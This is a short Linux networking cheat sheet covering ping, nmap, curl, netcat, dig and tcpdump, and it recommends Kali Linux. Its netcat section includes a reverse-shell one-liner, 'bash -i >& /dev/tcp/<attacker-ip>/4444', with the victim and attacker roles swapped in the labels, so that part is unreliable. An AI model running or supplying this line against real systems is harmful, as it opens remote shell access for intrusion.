# **Networking Commands - Linux Quick Reference**

## Table of Contents
- [Network Utilities](#network-utilities)
- [Netcat Commands](#netcat-commands)
- [Network Troubleshooting](#network-troubleshooting)

Recommended OS: Kali Linux

---

## Network Utilities

- **`ping`**: Test connectivity to a host.  `ping <hostname or ip>`
- **`ifconfig`**: Display or configure network interfaces.  `ifconfig`
- **`netstat`**: Show network connections and statistics.  `netstat -tuln`
- **`nmap`**: Scan network for hosts and open ports.
  ex. `nmap <ip>` or `nmap 192.168.1.1-20` or `nmap 192.168.1.0/24`
- **`curl`**: Transfer data to and from a server (HTTP, FTP).  `curl http://example.com/file.zip`
- **`route`**: View or modify the routing table.  `route -n`

---

## Netcat Commands

- **Listen on port**:  `nc -lvp 1234`
- **Connect to host (chat, etc.)**:  `nc <hostname or IP> 1234`
- **Send file**:  
  **Receiver opens port and preps redirect**:  `nc -l 12345 > received_file.txt`  
  **Sender connects and redirects file to receiver ip**:  `nc <receiver_ip> 12345 < my_file.txt`
- **Reverse Shell**:  
  **Victim opens port**:  `nc -lvp 4444`  
  **Attacker**:  `bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1`  

---

## Network Troubleshooting

- **`dig`**: Query DNS.  `dig example.com`
- **`tcpdump`**: Capture network traffic.  `sudo tcpdump -i eth0` or `sudo tcpdump src host <ip>`
- **`hostname`**: Show or set hostname.  `hostname`

---

*Created by MD Harrell*  
For more info, visit the [Kali Linux Docs](https://www.kali.org/docs/).
